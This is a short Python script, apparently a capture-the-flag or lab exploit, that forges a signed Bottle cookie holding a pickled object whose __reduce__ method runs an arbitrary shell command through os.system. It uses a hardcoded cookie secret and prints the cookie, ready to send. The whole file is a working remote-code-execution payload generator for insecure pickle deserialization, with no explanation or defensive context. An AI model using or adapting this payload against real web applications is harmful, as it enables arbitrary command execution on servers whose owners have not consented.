from bottle import response
import sys

command = sys.argv[1]

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

response.set_cookie('name', {'name': 'admin', 'v': PickleRce()}, secret="Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu")
print(f'Cookie: {response.headerlist[1][1]}')